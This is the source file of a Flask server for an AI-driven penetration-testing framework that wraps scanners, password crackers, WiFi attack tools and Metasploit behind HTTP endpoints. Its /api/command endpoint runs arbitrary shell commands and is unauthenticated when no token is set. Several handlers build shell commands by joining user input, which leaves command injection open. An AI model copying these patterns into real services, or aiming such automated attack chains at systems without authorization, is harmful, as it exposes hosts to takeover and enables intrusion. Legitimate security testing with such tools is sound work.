#!/usr/bin/env python3
"""
HexStrike AI - Advanced Penetration Testing Framework Server

Enhanced with AI-Powered Intelligence & Automation
🚀 Bug Bounty | CTF | Red Team | Security Research

Framework: FastMCP integration for AI agent communication
"""

import argparse
import base64
import json
import logging
import os
import subprocess
import sys
import traceback
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import Dict, Any, Optional
from pathlib import Path
from flask import Flask, request, jsonify, abort
import requests
import re
from tool_registry import classify_intent, get_tools_for_category, format_tools_for_prompt, get_all_categories
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import selenium
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.webdriver import WebDriver as ChromeWebDriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import mitmproxy
from mitmproxy import http as mitmhttp
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.options import Options as MitmOptions
import server_core.config_core as config_core
from server_core import *
from server_api import *
from shared.target_types import TechnologyStack

# ============================================================================
# LOGGING CONFIGURATION (MUST BE FIRST)
# ============================================================================

# Configure logging with fallback for permission issues
try:
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler('hexstrike.log')
        ]
    )
except PermissionError:
    # Fallback to console-only logging if file creation fails
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(sys.stdout)
        ]
    )
logger = logging.getLogger(__name__)

# Flask app configuration
app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False

# API Configuration
API_PORT = int(os.environ.get('HEXSTRIKE_PORT', 8888))
API_HOST = os.environ.get('HEXSTRIKE_HOST', '127.0.0.1')  # e.g. export HEXSTRIKE_HOST=0.0.0.0
API_TOKEN = os.environ.get("HEXSTRIKE_API_TOKEN", None)  # e.g. export API_TOKEN=secret-token

#Wordlists
ROCKYOU_PATH = config_core.get_word_list_path("rockyou")
COMMON_DIRB_PATH = config_core.get_word_list_path("common_dirb")
COMMON_DIRSEARCH_PATH = config_core.get_word_list_path("common_dirsearch")

session_store = SessionStore()
wordlist_store = WordlistStore()

# ============================================================================
# INTELLIGENT DECISION ENGINE (v6.0 ENHANCEMENT)
# ============================================================================

# Global decision engine instance
decision_engine = IntelligentDecisionEngine()

# ============================================================================
# INTELLIGENT ERROR HANDLING AND RECOVERY SYSTEM (v11.0 ENHANCEMENT)
# ============================================================================

# Global error handler and degradation manager instances
error_handler = IntelligentErrorHandler()
degradation_manager = GracefulDegradation()

# Global bug bounty workflow manager
bugbounty_manager = BugBountyWorkflowManager()
fileupload_framework = FileUploadTestingFramework()

# ============================================================================
# ADVANCED PROCESS MANAGEMENT AND MONITORING
# ============================================================================

# Global instances
tech_detector = TechnologyDetector()
rate_limiter = RateLimitDetector()
failure_recovery = FailureRecoverySystem()
performance_monitor = PerformanceMonitor()
parameter_optimizer = ParameterOptimizer()
enhanced_process_manager = EnhancedProcessManager()

# Global CTF framework instances
ctf_manager = CTFWorkflowManager()
ctf_tools = CTFToolManager()
ctf_automator = CTFChallengeAutomator()
ctf_coordinator = CTFTeamCoordinator()

# ============================================================================
# PROCESS MANAGEMENT FOR COMMAND TERMINATION
# ============================================================================

# Process management for command termination
active_processes = {}  # pid -> process info
process_lock = threading.Lock()

# ============================================================================
# ADVANCED VULNERABILITY INTELLIGENCE SYSTEM (v6.0 ENHANCEMENT)
# ============================================================================
from server_core.setup_logging import setup_logging

# Configuration (using existing API_PORT from top of file)
DEBUG_MODE = os.environ.get("DEBUG_MODE", "0").lower() in ("1", "true", "yes", "y")
COMMAND_TIMEOUT = config_core.get("COMMAND_TIMEOUT", 300)  # 5 minutes default timeout
CACHE_SIZE = config_core.get("CACHE_SIZE", 1000)
CACHE_TTL = config_core.get("CACHE_TTL", 3600)  # 1 hour default TTL

# Global cache instance
cache = HexStrikeCache()

# Global telemetry collector
telemetry = TelemetryCollector()

# Global intelligence managers
cve_intelligence = CVEIntelligenceManager()
exploit_generator = AIExploitGenerator()
vulnerability_correlator = VulnerabilityCorrelator()

def execute_command_with_recovery(
  tool_name: str,
  command: str,
  parameters: Optional[Dict[str, Any]] = None,
  use_cache: bool = True,
  max_attempts: int = 3
) -> Dict[str, Any]:
  return _execute_command_with_recovery(
    tool_name=tool_name,
    command=command,
    parameters=parameters,
    use_cache=use_cache,
    max_attempts=max_attempts,
    execute_command_fn=_execute_command,
    error_handler=error_handler,
    degradation_manager=degradation_manager,
    rebuild_command_with_params_fn= _rebuild_command_with_params,
    determine_operation_type_fn= _determine_operation_type,
    recovery_action_enum=RecoveryAction,
    logger=logger,
  )
# API Routes

@app.before_request
def optional_bearer_auth():
    # If no token is configured, allow all requests
    if not API_TOKEN:
        return

    auth_header = request.headers.get("Authorization", "")
    prefix = "Bearer "

    if not auth_header.startswith(prefix):
        abort(401, description="Unexpected authorization header format")

    token = auth_header[len(prefix):]
    if token != API_TOKEN:
        abort(401, description="Unauthorized!")

@app.route("/health", methods=["GET"])
def health_check():
    """Health check endpoint with comprehensive tool detection"""

    essential_tools = [
        "nmap", "gobuster", "dirb", "nikto", "sqlmap", "hydra", "john", "hashcat"
    ]

    network_tools = [
        "rustscan", "masscan", "autorecon", "nbtscan", "arp-scan", "responder",
        "nxc", "enum4linux-ng", "rpcclient", "enum4linux"
    ]

    web_security_tools = [
        "ffuf", "feroxbuster", "dirsearch", "dotdotpwn", "xsser", "wfuzz",
        "gau", "waybackurls", "arjun", "paramspider", "x8", "jaeles", "dalfox",
        "httpx", "wafw00f", "burpsuite", "zaproxy", "katana", "hakrawler"
    ]

    vuln_scanning_tools = [
        "nuclei", "wpscan", "graphql-scanner", "jwt-analyzer"
    ]

    password_tools = [
        "medusa", "patator", "hashid", "ophcrack", "hashcat-utils"
    ]

    binary_tools = [
        "gdb", "radare2", "binwalk", "ropgadget", "checksec", "objdump",
        "ghidra", "pwntools", "one-gadget", "ropper", "angr", "libc-database",
        "pwninit"
    ]

    forensics_tools = [
        "vol", "steghide", "hashpump", "foremost", "exiftool",
        "strings", "xxd", "file", "photorec", "testdisk", "scalpel", "bulk-extractor",
        "stegsolve", "zsteg", "outguess"
    ]

    cloud_tools = [
        "prowler", "scout-suite", "trivy", "kube-hunter", "kube-bench",
        "docker-bench-security", "checkov", "terrascan", "falco", "clair"
    ]

    osint_tools = [
        "amass", "subfinder", "fierce", "dnsenum", "theharvester", "sherlock",
        "social-analyzer", "recon-ng", "maltego", "spiderfoot", "shodan-cli",
        "censys-cli", "have-i-been-pwned", "whois", "bbot"
    ]

    exploitation_tools = [
        "msfconsole", "msfvenom", "searchsploit"
    ]

    api_tools = [
        "api-schema-analyzer", "postman", "insomnia", "curl", "httpie", "anew", "qsreplace", "uro"
    ]

    wireless_tools = [
        "kismet", "wireshark", "tshark", "tcpdump"
    ]

    additional_tools = [
        "smbmap", "volatility", "sleuthkit", "autopsy", "evil-winrm",
        "paramspider", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng",
        "graphql-scanner", "jwt-analyzer"
    ]

    all_tools = (
        essential_tools + network_tools + web_security_tools + vuln_scanning_tools +
        password_tools + binary_tools + forensics_tools + cloud_tools +
        osint_tools + exploitation_tools + api_tools + wireless_tools + additional_tools
    )
    tools_status = {}

    for tool in all_tools:
        try:
            result = execute_command(f"which {tool}", use_cache=True)
            tools_status[tool] = result["success"]
        except:
            tools_status[tool] = False

    all_essential_tools_available = all(tools_status[tool] for tool in essential_tools)

    category_stats = {
        "essential": {"total": len(essential_tools), "available": sum(1 for tool in essential_tools if tools_status.get(tool, False))},
        "network": {"total": len(network_tools), "available": sum(1 for tool in network_tools if tools_status.get(tool, False))},
        "web_security": {"total": len(web_security_tools), "available": sum(1 for tool in web_security_tools if tools_status.get(tool, False))},
        "vuln_scanning": {"total": len(vuln_scanning_tools), "available": sum(1 for tool in vuln_scanning_tools if tools_status.get(tool, False))},
        "password": {"total": len(password_tools), "available": sum(1 for tool in password_tools if tools_status.get(tool, False))},
        "binary": {"total": len(binary_tools), "available": sum(1 for tool in binary_tools if tools_status.get(tool, False))},
        "forensics": {"total": len(forensics_tools), "available": sum(1 for tool in forensics_tools if tools_status.get(tool, False))},
        "cloud": {"total": len(cloud_tools), "available": sum(1 for tool in cloud_tools if tools_status.get(tool, False))},
        "osint": {"total": len(osint_tools), "available": sum(1 for tool in osint_tools if tools_status.get(tool, False))},
        "exploitation": {"total": len(exploitation_tools), "available": sum(1 for tool in exploitation_tools if tools_status.get(tool, False))},
        "api": {"total": len(api_tools), "available": sum(1 for tool in api_tools if tools_status.get(tool, False))},
        "wireless": {"total": len(wireless_tools), "available": sum(1 for tool in wireless_tools if tools_status.get(tool, False))},
        "additional": {"total": len(additional_tools), "available": sum(1 for tool in additional_tools if tools_status.get(tool, False))}
    }

    return jsonify({
        "status": "healthy",
        "message": "HexStrike AI Tools API Server is operational",
        "version": config_core.get("VERSION", "unknown"),
        "tools_status": tools_status,
        "all_essential_tools_available": all_essential_tools_available,
        "total_tools_available": sum(1 for tool, available in tools_status.items() if available),
        "total_tools_count": len(all_tools),
        "category_stats": category_stats,
        "cache_stats": cache.get_stats(),
        "telemetry": telemetry.get_stats(),
        "uptime": time.time() - telemetry.stats["start_time"]
    })

@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({
        "success": True,
        "message": "Pong! HexStrike AI Tools API Server is responsive",
        "timestamp": datetime.now().isoformat()
    })

@app.route("/api/command", methods=["POST"])
def generic_command():
    """Execute any command provided in the request with enhanced logging"""
    try:
        params = request.json
        command = params.get("command", "")
        use_cache = params.get("use_cache", True)

        if not command:
            logger.warning("⚠️  Command endpoint called without command parameter")
            return jsonify({
                "error": "Command parameter is required"
            }), 400

        result = execute_command(command, use_cache=use_cache)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in command endpoint: {str(e)}")
        logger.error(traceback.format_exc())
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# File Operations API Endpoints

@app.route("/api/files/create", methods=["POST"])
def create_file():
    """Create a new file"""
    try:
        params = request.json
        filename = params.get("filename", "")
        content = params.get("content", "")
        binary = params.get("binary", False)

        if not filename:
            return jsonify({"error": "Filename is required"}), 400

        result = file_manager.create_file(filename, content, binary)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error creating file: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/files/modify", methods=["POST"])
def modify_file():
    """Modify an existing file"""
    try:
        params = request.json
        filename = params.get("filename", "")
        content = params.get("content", "")
        append = params.get("append", False)

        if not filename:
            return jsonify({"error": "Filename is required"}), 400

        result = file_manager.modify_file(filename, content, append)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error modifying file: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/files/delete", methods=["DELETE"])
def delete_file():
    """Delete a file or directory"""
    try:
        params = request.json
        filename = params.get("filename", "")

        if not filename:
            return jsonify({"error": "Filename is required"}), 400

        result = file_manager.delete_file(filename)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error deleting file: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/files/list", methods=["GET"])
def list_files():
    """List files in a directory"""
    try:
        directory = request.args.get("directory", ".")
        result = file_manager.list_files(directory)
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error listing files: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# Payload Generation Endpoint
@app.route("/api/payloads/generate", methods=["POST"])
def generate_payload():
    """Generate large payloads for testing"""
    try:
        params = request.json
        payload_type = params.get("type", "buffer")
        size = params.get("size", 1024)
        pattern = params.get("pattern", "A")
        filename = params.get("filename", f"payload_{int(time.time())}")

        if size > 100 * 1024 * 1024:  # 100MB limit
            return jsonify({"error": "Payload size too large (max 100MB)"}), 400

        if payload_type == "buffer":
            content = pattern * (size // len(pattern))
        elif payload_type == "cyclic":
            # Generate cyclic pattern
            alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            content = ""
            for i in range(size):
                content += alphabet[i % len(alphabet)]
        elif payload_type == "random":
            import random
            import string
            content = ''.join(random.choices(string.ascii_letters + string.digits, k=size))
        else:
            return jsonify({"error": "Invalid payload type"}), 400

        result = file_manager.create_file(filename, content)
        result["payload_info"] = {
            "type": payload_type,
            "size": size,
            "pattern": pattern
        }

        logger.info(f"🎯 Generated {payload_type} payload: {filename} ({size} bytes)")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error generating payload: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# Cache Management Endpoint
@app.route("/api/cache/stats", methods=["GET"])
def cache_stats():
    """Get cache statistics"""
    return jsonify(cache.get_stats())

@app.route("/api/cache/clear", methods=["POST"])
def clear_cache():
    """Clear the cache"""
    cache.cache.clear()
    cache.stats = {"hits": 0, "misses": 0, "evictions": 0}
    logger.info("🧹 Cache cleared")
    return jsonify({"success": True, "message": "Cache cleared"})

# Telemetry Endpoint
@app.route("/api/telemetry", methods=["GET"])
def get_telemetry():
    """Get system telemetry"""
    return jsonify(telemetry.get_stats())

# ============================================================================
# DATABASE INTERACTION API ENDPOINTS
# ============================================================================
app.register_blueprint(api_database_bp)

# ============================================================================
# OPS API ENDPOINTS
# ============================================================================
app.register_blueprint(api_visual_bp)
app.register_blueprint(api_auto_tool_bp)
app.register_blueprint(api_process_management_bp)
app.register_blueprint(api_wordlist_store_bp)

# ============================================================================
# PASSWORD CRACKING API ENDPOINTS
# ============================================================================
app.register_blueprint(api_password_cracking_medusa_bp)
app.register_blueprint(api_password_cracking_patator_bp)
app.register_blueprint(api_password_cracking_hashid_bp)
app.register_blueprint(api_password_cracking_ophcrack_bp)
app.register_blueprint(api_password_cracking_aircrack_ng_bp)

# ============================================================================
# RECONNAISSANCE API ENDPOINTS
# ============================================================================
app.register_blueprint(api_recon_theharvester_bp)

# ============================================================================
# EXPLOITATION API ENDPOINTS
# ============================================================================
app.register_blueprint(api_exploit_framework_exploit_db_bp)

# ============================================================================
# BINARY ANALYSIS API ENDPOINTS
# ============================================================================
app.register_blueprint(api_binary_analysis_autopsy_bp)

# ============================================================================
# WIFI PENTEST API ENDPOINTS
# ============================================================================
app.register_blueprint(api_wifi_pentest_aircrack_ng_bp)
app.register_blueprint(api_wifi_pentest_airmon_ng_bp)
app.register_blueprint(api_wifi_pentest_airodump_ng_bp)
app.register_blueprint(api_wifi_pentest_aireplay_ng_bp)
app.register_blueprint(api_wifi_pentest_airbase_ng_bp)
app.register_blueprint(api_wifi_pentest_airdecap_ng_bp)
app.register_blueprint(api_wifi_pentest_hcxpcapngtool_bp)
app.register_blueprint(api_wifi_pentest_hcxdumptool_bp)
app.register_blueprint(api_wifi_pentest_eaphammer_bp)
app.register_blueprint(api_wifi_pentest_wifite2_bp)
app.register_blueprint(api_wifi_pentest_bettercap_wifi_bp)
app.register_blueprint(api_wifi_pentest_mdk4_bp)

# !NEW BLUEPRINTS GOES HERE!

# ============================================================================
# BOT API ENDPOINTS
# ============================================================================

@app.route("/api/bot/bbot", methods=["POST"])
def bbot_endpoint():
    """Endpoint for BBot interactions

    parameters:
        -f Enable these flags (e.g. -f subdomain-enum)
        -rf Require modules to have this flag (e.g. -rf safe)
        -ef Exclude these flags (e.g. -ef slow)
        -em Exclude these individual modules (e.g. -em ipneighbor)
    """
    try:
        data = request.get_json()
        if not data or "target" not in data or "parameters" not in data:
            return jsonify({"error": "Missing 'target' or 'parameters' in payload"}), 400
        target = data["target"]
        parameters = data["parameters"]

        cmd_parts = ['bbot', "-t " + target]
        for key, value in parameters.items():
            if isinstance(value, str) and value:
                cmd_parts.append(f"-{key} {value}")

        result = execute_command(" ".join(cmd_parts), use_cache=False)

        logger.info(f"📊 BBot scan completed for {target}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in BBot endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# INTELLIGENT DECISION ENGINE API ENDPOINTS
# ============================================================================

@app.route("/api/intelligence/find-best-wordlist", methods=["POST"])
def api_find_best_wordlist():
    """
    Find the best wordlist for a given task or criteria.

    Request JSON:
        {
            "criteria": {
                "for_task": "dirbusting",     # Task (matches 'recommended_for')
                "tool": "dirb",               # Tool (matches 'tool')
                "type": "directory",          # Wordlist type ('password', 'directory')
                "language": "en",             # Language
                "speed": "fast",              # Speed category
                "coverage": "broad",          # Coverage
                "format": "txt",              # Format
                "source": "DirB"              # Source
            }
        }

    Response JSON:
        {
            "wordlist": {
                "name": "common_dirb",
                "path": "/usr/share/wordlists/dirb/common.txt",
                "type": "directory",
                "description": "...",
                "recommended_for": [...],
                "size": 4614,
                "tool": [...],
                "speed": "medium",
                "language": "en",
                "coverage": "broad",
                "format": "txt",
                "source": "DirB"
            }
        }

    Returns the best matching wordlist, or a fallback if no perfect match.
    """
    data = request.get_json(force=True)
    criteria = data.get("criteria", {})
    result = config_core.find_best_wordlist(criteria)
    if result:
        return jsonify(result)
    else:
        return jsonify({"wordlist": None})

@app.route("/api/intelligence/analyze-target", methods=["POST"])
def analyze_target():
    """Analyze target and create comprehensive profile using Intelligent Decision Engine"""
    try:
        data = request.get_json()
        if not data or 'target' not in data:
            return jsonify({"error": "Target is required"}), 400

        target = data['target']
        logger.info(f"🧠 Analyzing target: {target}")

        # Use the decision engine to analyze the target
        profile = decision_engine.analyze_target(target)

        logger.info(f"✅ Target analysis completed for {target}")
        logger.info(f"📊 Target type: {profile.target_type.value}, Risk level: {profile.risk_level}")

        return jsonify({
            "success": True,
            "target_profile": profile.to_dict(),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error analyzing target: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/select-tools", methods=["POST"])
def select_optimal_tools():
    """Select optimal tools based on target profile and objective"""
    try:
        data = request.get_json()
        if not data or 'target' not in data:
            return jsonify({"error": "Target is required"}), 400

        target = data['target']
        objective = data.get('objective', 'comprehensive')  # comprehensive, quick, stealth

        logger.info(f"🎯 Selecting optimal tools for {target} with objective: {objective}")

        # Analyze target first
        profile = decision_engine.analyze_target(target)

        # Select optimal tools
        selected_tools = decision_engine.select_optimal_tools(profile, objective)

        logger.info(f"✅ Selected {len(selected_tools)} tools for {target}")

        return jsonify({
            "success": True,
            "target": target,
            "objective": objective,
            "target_profile": profile.to_dict(),
            "selected_tools": selected_tools,
            "tool_count": len(selected_tools),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error selecting tools: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/classify-task", methods=["POST"])
def classify_task():
    """Classify a security task and return recommended tools with compact schemas"""
    try:
        data = request.get_json()
        if not data or 'description' not in data:
            return jsonify({"error": "Description is required"}), 400

        description = data['description']
        category, confidence = classify_intent(description)
        tools = get_tools_for_category(category)

        return jsonify({
            "success": True,
            "category": category,
            "confidence": confidence,
            "category_description": get_all_categories().get(category, ""),
            "tools": tools,
            "tool_summary": format_tools_for_prompt(tools), # could be returned empty, if not using agentic mode.
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        logger.error(f"💥 Error classifying task: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/optimize-parameters", methods=["POST"])
def optimize_tool_parameters():
    """Optimize tool parameters based on target profile and context"""
    try:
        data = request.get_json()
        if not data or 'target' not in data or 'tool' not in data:
            return jsonify({"error": "Target and tool are required"}), 400

        target = data['target']
        tool = data['tool']
        context = data.get('context', {})

        logger.info(f"⚙️  Optimizing parameters for {tool} against {target}")

        # Analyze target first
        profile = decision_engine.analyze_target(target)

        # Optimize parameters
        optimized_params = decision_engine.optimize_parameters(tool, profile, context)

        logger.info(f"✅ Parameters optimized for {tool}")

        return jsonify({
            "success": True,
            "target": target,
            "tool": tool,
            "context": context,
            "target_profile": profile.to_dict(),
            "optimized_parameters": optimized_params,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error optimizing parameters: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/create-attack-chain", methods=["POST"])
def create_attack_chain():
    """Create an intelligent attack chain based on target profile"""
    try:
        data = request.get_json()
        if not data or 'target' not in data:
            return jsonify({"error": "Target is required"}), 400

        target = data['target']
        objective = data.get('objective', 'comprehensive')

        logger.info(f"⚔️  Creating attack chain for {target} with objective: {objective}")

        # Analyze target first
        profile = decision_engine.analyze_target(target)

        # Create attack chain
        attack_chain = decision_engine.create_attack_chain(profile, objective)

        logger.info(f"✅ Attack chain created with {len(attack_chain.steps)} steps")
        logger.info(f"📊 Success probability: {attack_chain.success_probability:.2f}, Estimated time: {attack_chain.estimated_time}s")

        return jsonify({
            "success": True,
            "target": target,
            "objective": objective,
            "target_profile": profile.to_dict(),
            "attack_chain": attack_chain.to_dict(),
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error creating attack chain: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/intelligence/smart-scan", methods=["POST"])
def intelligent_smart_scan():
    """Execute an intelligent scan using AI-driven tool selection and parameter optimization with parallel execution"""
    try:
        data = request.get_json()
        if not data or 'target' not in data:
            return jsonify({"error": "Target is required"}), 400

        target = data['target']
        objective = data.get('objective', 'comprehensive')
        max_tools = data.get('max_tools', 5)

        logger.info(f"🚀 Starting intelligent smart scan for {target}")

        # Analyze target
        profile = decision_engine.analyze_target(target)

        # Select optimal tools
        selected_tools = decision_engine.select_optimal_tools(profile, objective)[:max_tools]

        # Execute tools in parallel with real tool execution
        scan_results = {
            "target": target,
            "target_profile": profile.to_dict(),
            "tools_executed": [],
            "total_vulnerabilities": 0,
            "execution_summary": {},
            "combined_output": ""
        }

        combined_output_parts = []

        def execute_single_tool(tool_name, target, profile):
            """Execute a single tool and return results"""
            try:
                logger.info(f"🔧 Executing {tool_name} with optimized parameters")

                # Get optimized parameters for this tool
                optimized_params = decision_engine.optimize_parameters(tool_name, profile)

                # Map tool names to their actual execution functions
                tool_execution_map = {
                    'nmap': lambda: execute_nmap_scan(target, optimized_params),
                    'gobuster': lambda: execute_gobuster_scan(target, optimized_params),
                    'nuclei': lambda: execute_nuclei_scan(target, optimized_params),
                    'nikto': lambda: execute_nikto_scan(target, optimized_params),
                    'sqlmap': lambda: execute_sqlmap_scan(target, optimized_params),
                    'ffuf': lambda: execute_ffuf_scan(target, optimized_params),
                    'feroxbuster': lambda: execute_feroxbuster_scan(target, optimized_params),
                    'katana': lambda: execute_katana_scan(target, optimized_params),
                    'httpx': lambda: execute_httpx_scan(target, optimized_params),
                    'wpscan': lambda: execute_wpscan_scan(target, optimized_params),
                    'dirsearch': lambda: execute_dirsearch_scan(target, optimized_params),
                    'arjun': lambda: execute_arjun_scan(target, optimized_params),
                    'paramspider': lambda: execute_paramspider_scan(target, optimized_params),
                    'dalfox': lambda: execute_dalfox_scan(target, optimized_params),
                    'amass': lambda: execute_amass_scan(target, optimized_params),
                    'subfinder': lambda: execute_subfinder_scan(target, optimized_params)
                }

                # Execute the tool if we have a mapping for it
                if tool_name in tool_execution_map:
                    result = tool_execution_map[tool_name]()

                    # Extract vulnerability count from result
                    vuln_count = 0
                    if result.get('success') and result.get('stdout'):
                        # Simple vulnerability detection based on common patterns
                        output = result.get('stdout', '')
                        vuln_indicators = ['CRITICAL', 'HIGH', 'MEDIUM', 'VULNERABILITY', 'EXPLOIT', 'SQL injection', 'XSS', 'CSRF']
                        vuln_count = sum(1 for indicator in vuln_indicators if indicator.lower() in output.lower())

                    return {
                        "tool": tool_name,
                        "parameters": optimized_params,
                        "status": "success" if result.get('success') else "failed",
                        "timestamp": datetime.now().isoformat(),
                        "execution_time": result.get('execution_time', 0),
                        "stdout": result.get('stdout', ''),
                        "stderr": result.get('stderr', ''),
                        "vulnerabilities_found": vuln_count,
                        "command": result.get('command', ''),
                        "success": result.get('success', False)
                    }
                else:
                    logger.warning(f"⚠️ No execution mapping found for tool: {tool_name}")
                    return {
                        "tool": tool_name,
                        "parameters": optimized_params,
                        "status": "skipped",
                        "timestamp": datetime.now().isoformat(),
                        "error": f"Tool {tool_name} not implemented in execution map",
                        "success": False
                    }

            except Exception as e:
                logger.error(f"❌ Error executing {tool_name}: {str(e)}")
                return {
                    "tool": tool_name,
                    "status": "failed",
                    "timestamp": datetime.now().isoformat(),
                    "error": str(e),
                    "success": False
                }

        # Execute tools in parallel using ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=min(len(selected_tools), 5)) as executor:
            # Submit all tool executions
            future_to_tool = {
                executor.submit(execute_single_tool, tool, target, profile): tool
                for tool in selected_tools
            }

            # Collect results as they complete
            for future in future_to_tool:
                tool_result = future.result()
                scan_results["tools_executed"].append(tool_result)

                # Accumulate vulnerability count
                if tool_result.get("vulnerabilities_found"):
                    scan_results["total_vulnerabilities"] += tool_result["vulnerabilities_found"]

                # Combine outputs
                if tool_result.get("stdout"):
                    combined_output_parts.append(f"\n=== {tool_result['tool'].upper()} OUTPUT ===\n")
                    combined_output_parts.append(tool_result["stdout"])
                    combined_output_parts.append("\n" + "="*50 + "\n")

        scan_results["combined_output"] = "".join(combined_output_parts)

        # Create execution summary
        successful_tools = [t for t in scan_results["tools_executed"] if t.get("success")]
        failed_tools = [t for t in scan_results["tools_executed"] if not t.get("success")]

        scan_results["execution_summary"] = {
            "total_tools": len(selected_tools),
            "successful_tools": len(successful_tools),
            "failed_tools": len(failed_tools),
            "success_rate": len(successful_tools) / len(selected_tools) * 100 if selected_tools else 0,
            "total_execution_time": sum(t.get("execution_time", 0) for t in scan_results["tools_executed"]),
            "tools_used": [t["tool"] for t in successful_tools]
        }

        logger.info(f"✅ Intelligent smart scan completed for {target}")
        logger.info(f"📊 Results: {len(successful_tools)}/{len(selected_tools)} tools successful, {scan_results['total_vulnerabilities']} vulnerabilities found")

        return jsonify({
            "success": True,
            "scan_results": scan_results,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in intelligent smart scan: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}", "success": False}), 500

# Helper functions for intelligent smart scan tool execution
def execute_nmap_scan(target, params):
    """Execute nmap scan with optimized parameters"""
    try:
        scan_type = params.get('scan_type', '-sV')
        ports = params.get('ports', '')
        additional_args = params.get('additional_args', '')

        # Build nmap command
        cmd_parts = ['nmap', scan_type]
        if ports:
            cmd_parts.extend(['-p', ports])
        if additional_args:
            cmd_parts.extend(additional_args.split())
        cmd_parts.append(target)

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_gobuster_scan(target, params):
    """Execute gobuster scan with optimized parameters"""
    try:
        mode = params.get('mode', 'dir')
        wordlist = params.get('wordlist', COMMON_DIRB_PATH)
        additional_args = params.get('additional_args', '')

        cmd_parts = ['gobuster', mode, '-u', target, '-w', wordlist]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_nuclei_scan(target, params):
    """Execute nuclei scan with optimized parameters"""
    try:
        severity = params.get('severity', '')
        tags = params.get('tags', '')
        additional_args = params.get('additional_args', '')

        cmd_parts = ['nuclei', '-u', target]
        if severity:
            cmd_parts.extend(['-severity', severity])
        if tags:
            cmd_parts.extend(['-tags', tags])
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_nikto_scan(target, params):
    """Execute nikto scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['nikto', '-h', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_sqlmap_scan(target, params):
    """Execute sqlmap scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '--batch --random-agent')
        cmd_parts = ['sqlmap', '-u', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_ffuf_scan(target, params):
    """Execute ffuf scan with optimized parameters"""
    try:
        wordlist = params.get('wordlist', COMMON_DIRB_PATH)
        additional_args = params.get('additional_args', '')

        # Ensure target has FUZZ placeholder
        if 'FUZZ' not in target:
            target = target.rstrip('/') + '/FUZZ'

        cmd_parts = ['ffuf', '-u', target, '-w', wordlist]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_feroxbuster_scan(target, params):
    """Execute feroxbuster scan with optimized parameters"""
    try:
        wordlist = params.get('wordlist', COMMON_DIRB_PATH)
        additional_args = params.get('additional_args', '')

        cmd_parts = ['feroxbuster', '-u', target, '-w', wordlist]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_katana_scan(target, params):
    """Execute katana scan with optimized parameters"""
    try:
        additional_args = params.get('additional_args', '')
        cmd_parts = ['katana', '-u', target]
        if additional_args:
            cmd_parts.extend(additional_args.split())

        return execute_command(' '.join(cmd_parts))
    except Exception as e:
        return {"success": False, "error": str(e)}

